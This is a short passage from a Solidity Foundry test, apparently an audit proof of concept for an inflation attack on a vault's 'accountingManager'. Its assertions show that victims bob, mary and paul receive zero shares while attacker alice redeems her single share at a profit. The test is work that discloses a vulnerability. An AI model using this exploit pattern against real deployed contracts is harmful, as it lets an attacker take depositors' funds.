        accountingManager.calculateDepositShares(victims.length);
        vm.warp(block.timestamp + 35 minutes);
        accountingManager.executeDeposit(victims.length, connector, "");

        // Confirm all victims receive 0 wei of shares
        assertEq(accountingManager.balanceOf(address(bob)), 0);
        assertEq(accountingManager.balanceOf(address(mary)), 0);
        assertEq(accountingManager.balanceOf(address(paul)), 0);

        // Confirm total shares is 1
        assertEq(accountingManager.totalSupply(), 1);

        // Confirm alice owns the single share
        assertEq(accountingManager.balanceOf(address(alice)), 1);

        // Confirm alice can redeem single share for a profit i.e. > 10_000
        // Amount received by Alice will be half of totalAssets
        assertEq(accountingManager.previewRedeem(1), 12_501);

        assertEq(IERC20(baseToken).balanceOf(address(accountingManager)), directDeposit);
        vm.stopPrank();
    }

